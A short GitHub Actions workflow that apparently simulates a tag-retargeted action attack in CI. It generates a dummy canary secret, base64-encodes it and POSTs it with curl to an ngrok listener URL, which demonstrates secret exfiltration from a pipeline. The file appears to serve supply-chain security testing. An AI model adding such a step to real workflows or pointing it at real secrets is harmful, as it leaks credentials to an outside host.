name: Attack A1a Simulation
on: [workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Simulate Tag-Retargeted Action (A1a)
        run: |
          # Generate a unique dummy canary secret for this run
          CANARY="canary-secret-$(openssl rand -hex 8)"
          echo "Generated Canary: $CANARY"
          
          # Exfiltrate the canary to your local listener via ngrok
          ENCODED_CANARY=$(echo -n "$CANARY" | base64)
          curl -X POST -d "canary=$ENCODED_CANARY" https://shortage-euphemism-gleeful.ngrok-free.dev/listener
